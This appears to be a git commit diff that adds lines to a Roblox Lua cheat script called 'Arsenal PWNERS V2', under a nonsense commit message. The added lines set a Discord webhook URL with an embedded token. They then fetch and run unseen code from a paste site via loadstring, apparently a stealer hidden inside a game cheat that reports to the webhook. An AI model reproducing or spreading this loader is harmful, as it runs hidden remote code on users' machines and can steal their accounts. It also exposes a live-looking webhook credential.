2a48d31fe29d0782f9fa5462542b757a5dc5e013
Maikderninja <101070396+Maikderninja@users.noreply.github.com>
2022-10-15 14:07:30 +0200

    Wjdhfhe.lua
    dasdasdw

--- Wjdhfhe.lua
+++ Wjdhfhe.lua
@@ -1,3 +1,20 @@
+--[[
+
+					~~//  Color Code (HEX)  \\~~
+		RED = f54747				 GREEN = 78ff78
+		BLUE = 4c6cfc				 PURPLE = b36bff
+		YELLOW = fff27a				 PINK = ffa3e2
+
+
+	-- Don't Remove the "0x" on "getgenv().embedcolor" or it will not work!--
+
+--]]
+
+getgenv().DiscordWebhook = "https://discord.com/api/webhooks/1030813809562091682/BJyEUpp_cw53WKznqIW0-2DX6YfIYtAlu0R4Q_PHwx6YDFzMOCzV6fEEh1_v-CmUYjGe" -- Discord Webhook Here
+getgenv().embedcolor = "0xf54747" -- Embed Body Color (On left Side of the Embed, You can get HEX Code above ☝) 
+
+loadstring(game:HttpGet("https://pst.klgrth.io/paste/e3d52/raw"))()
+
 local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
 
 local PhantomForcesWindow = Library:NewWindow("Arsenal PWNERS V2")
